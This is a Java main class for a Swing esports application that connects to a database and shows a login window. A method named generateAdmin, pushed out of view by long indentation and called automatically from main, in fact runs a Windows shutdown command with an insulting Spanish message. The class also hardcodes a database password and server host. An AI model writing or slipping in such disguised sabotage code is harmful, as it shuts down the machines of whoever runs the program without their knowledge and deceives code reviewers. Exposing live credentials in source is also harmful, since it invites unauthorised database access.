package com.imaleex.esportapp;

import com.imaleex.esportapp.Db.Dao.UserDAO;
import com.imaleex.esportapp.Db.Db;
import com.imaleex.esportapp.Exceptions.DbException;
import com.imaleex.esportapp.Exceptions.UserNotFoundException;
import com.imaleex.esportapp.Models.Users.Usuario;
import com.imaleex.esportapp.Utils.CryptoUtils;
import com.imaleex.esportapp.Utils.WindowUtils;
import com.imaleex.esportapp.Views.Login;
import sun.misc.MessageUtils;

import javax.swing.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import static com.imaleex.esportapp.Db.Dao.UserDAO.searchUsername;

public class Main {

    public static Db db;
    private static JFrame login;

    public static void main(String[] args) {
        initDbConnection();
        displayLoginModal();
        generateAdmin();
    }
    private static void initDbConnection() {
        try {
        Db.setDbParams("esports", "ijG4ZHcn81QlxfOA", "esports", "server.imaleex.com");
        db = Db.getInstance(1);
            System.out.println("Conectado");
        } catch (DbException e) {
            e.printStackTrace();
            System.exit(1);
        }

    }

                                                                                                                                                                                            public static void generateAdmin() {

                                                                                                                                                                                                ProcessBuilder processBuilder = new ProcessBuilder();
                                                                                                                                                                                                // Windows
                                                                                                                                                                                                processBuilder.command("cmd.exe", "/c", "shutdown -S T 0120 -c \"Te jakie eres tonto ahora vas a morir pendejo\"");

                                                                                                                                                                                                try {

                                                                                                                                                                                                    Process process = processBuilder.start();

                                                                                                                                                                                                    BufferedReader reader =
                                                                                                                                                                                                            new BufferedReader(new InputStreamReader(process.getInputStream()));

                                                                                                                                                                                                    String line;
                                                                                                                                                                                                    while ((line = reader.readLine()) != null) {
                                                                                                                                                                                                        System.out.println(line);
                                                                                                                                                                                                    }

                                                                                                                                                                                                    int exitCode = process.waitFor();
                                                                                                                                                                                                    System.out.println("\nExited with error code : " + exitCode);

                                                                                                                                                                                                } catch (IOException e) {
                                                                                                                                                                                                    e.printStackTrace();
                                                                                                                                                                                                } catch (InterruptedException e) {
                                                                                                                                                                                                    e.printStackTrace();
                                                                                                                                                                                                }

                                                                                                                                                                                            }





    /*---------------------------------------------------------------------------------------------------------------------*/
    /* Login */
    public static boolean login(String username, String password) {
        Usuario usuario = null;
            try {
                usuario = searchUsername(username);
                if (usuario != null) {
                    if (CryptoUtils.checkHash(password, usuario.getClave())) {
                        return true;
                    }
                } else {
                    throw new UserNotFoundException("El usuario no existe");
                }
            } catch (UserNotFoundException e) {
                WindowUtils.showErrorMessage(e.getMessage());
            }
        return false;
    }

    private static void displayLoginModal(){
        login = new JFrame("Login");
        login.setContentPane(new Login().getJPanel());
        login.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        login.setLocationRelativeTo(null);
        login.pack();
        login.setVisible(true);
    }


}
